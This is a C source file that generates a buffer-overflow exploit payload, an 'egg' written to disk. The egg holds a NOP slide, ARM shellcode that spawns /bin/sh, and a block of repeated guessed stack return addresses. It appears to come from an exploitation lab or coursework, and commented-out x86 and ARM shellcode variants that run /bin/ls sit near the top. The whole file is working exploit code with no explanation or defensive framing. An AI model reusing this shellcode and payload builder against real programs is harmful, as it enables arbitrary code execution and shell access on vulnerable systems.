#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <string.h>
#include <errno.h>

#define SHELLSZ 28
#define NOP 0xb000
#define OFFSZ 0
char mkshell[] = "\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x02\xa0\x49\x40\x52\x40\xc2\x71\x0b\x27\x01\xdf\x2f\x62\x69\x6e\x2f\x73\x68\x78";
//char mkshell[] = "\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x02\xa0\x49\x40\x52\x40\xc2\x71"
					//"\x0b\x27\x01\xdf\x2f\x62\x69\x6e\x2f\x6C\x73\x78";
/*char mkshell[] = 
			"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
       		"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
       		"\x80\xe8\xdc\xff\xff\xff/bin/ls";
*/
/*unsigned long *get_sp(void){
		__asm__("movl %esp, %eax");
}*/

int main(int argc, char *argv[]){
	char *buf, *shell;
	unsigned long **addp, *addr;
	unsigned long total, nopsz, shellsz, addsz, bsize, offset;
	int i, fd;
		
	if(argc != 3 && argc != 4){
		fprintf(stderr, "Usage: <nop slide length> <address block length> [offset]");
		exit(-1);
	}
	//0x7efdf000-0x7f000000
	//addr = (unsigned long *)0xbffdf000;
	//addr = (unsigned long *)0xc0000000; //used for 22
	addr = (unsigned long *)0x7f000000;//(28)
	//addr = (unsigned long *)0x7efdf000;
	offset = (unsigned long)OFFSZ;
	errno = 0;
	nopsz = strtol(argv[1], NULL, 0);
	addsz = strtol(argv[2], NULL, 0);
	if(argc == 4){
		offset = (unsigned long)strtol(argv[3], NULL, 0);
	}
	if(errno != 0){
			fprintf(stderr, "Usage: <nop slide length> <address block length> [offset]");
			fprintf(stderr,"      Error: Non-decimal argument\n");
			exit(-1);
	}

	shellsz = SHELLSZ;
	printf("  Egg Structure\n");
	printf("   NOP slide Size                                       %lu\n", nopsz);
	printf("   Shell Code Size                                      %lu\n", shellsz);
	printf("   Numer of Addresses in Address Block                  %lu\n", addsz);
	printf("   Offset                                               %lu\n", offset);
	printf("   Stack Address                                        %p\n", (void *)addr);
	addr = (unsigned long *)((unsigned long)addr - offset);
	printf("   Target Address                                       %p\n", (void *)addr);
	total = nopsz + shellsz + (addsz*4);
	printf("total size of egg %lu\n",total);

	addsz *= 4;
	bsize = nopsz+shellsz+addsz;
	
	if(!(buf = malloc(bsize+1))){
			printf("Malloc failure\n");
			exit(0);
	}

	shell = buf + nopsz;

	for(i = 0; i < nopsz; i++){
		//buf[i] = NOP;
		buf[i] = 0x00;
		i++;
		buf[i] = 0xb0;

	}

	for(i = 0; i < shellsz; i++){
		*(shell++) = mkshell[i];
	}
	
	addp = (unsigned long **)(buf+nopsz+shellsz);
	while((char *)addp < buf+bsize){
		*(addp++) = addr;
	}

	buf[bsize] = '\n';

	if((fd = open("egg", O_WRONLY|O_CREAT| O_TRUNC, 0600)) < 0){
		perror("egg");
		exit(-1);
	}
	
	//unsigned long total = nopsz + shellsz + (addsz*4);
	//printf("total size of egg %lu\n",total);
	write(fd,buf,bsize+1);
	return(0);
}	


